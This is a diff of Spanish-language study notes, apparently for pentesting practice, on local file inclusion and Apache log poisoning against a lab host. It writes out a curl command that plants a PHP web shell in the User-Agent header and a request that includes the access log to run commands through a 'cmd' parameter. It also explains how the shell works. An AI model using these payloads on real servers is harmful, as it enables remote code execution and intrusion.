@@ -60,6 +60,7 @@ Incluye:
 [Fri Jun 06 12:34:56.789012 2025] [core:error] [pid 1234] [client 192.168.1.1:54321] File does not exist: /var/www/html/missing-page.html
 ```
 
+
 ### LFI, LOG POISONING
 
 Sabiendo lo que son los logs, si llegamos a tener acceso a ellos, podemos intentar aprovecharlo para ejecutar código malicioso.
@@ -112,17 +113,25 @@ Si además el servidor interpreta PHP dentro de esos logs, podemos enviar códig
 curl http://172.17.0.2/ -A "<?php system(\$_GET['cmd']);?>"
 ```
 
-Luego hacemos una solicitud que incluya el archivo de log y el comando a ejecutar:
+Aquí, el código PHP `<?php system(\$_GET['cmd']); ?>` hace lo siguiente:
+
+- `system()` es una función de PHP que ejecuta un comando en el sistema operativo.
+- `\$_GET['cmd']` toma el valor del parámetro `cmd` que se pasa en la URL.
+- Así, cuando se accede a la URL con `&cmd=algún_comando`, el servidor ejecuta ese comando y muestra la salida.
+
+Por eso, en la siguiente solicitud:
 
 ```bash
 curl "http://172.17.0.2/test.php?page=/var/log/apache2/access.log&cmd=id"
 ```
 
-O desde el navegador web:
+o desde el navegador:
 
 ```
 http://172.17.0.2/test.php?page=/var/log/apache2/access.log&cmd=id
 ```
+
+el parámetro `cmd=id` indica que queremos ejecutar el comando `id`.
 
 Si logramos incrustar código PHP en el log y que luego sea interpretado, podremos ejecutar comandos arbitrarios en el servidor.
 
@@ -131,9 +140,7 @@ Si logramos incrustar código PHP en el log y que luego sea interpretado, podrem
 **Resumen:**  
 - Accedemos a archivos de logs vía LFI  
 - Inyectamos código PHP malicioso en los logs (log poisoning)  
-- Si el log se interpreta como PHP, ejecutamos código remoto  
+- Si el log se interpreta como PHP, ejecutamos código remoto usando el parámetro `cmd` para pasar el comando  
 - Esto permite ejecutar comandos en el servidor y leer archivos sensibles
 
 ```
-
-
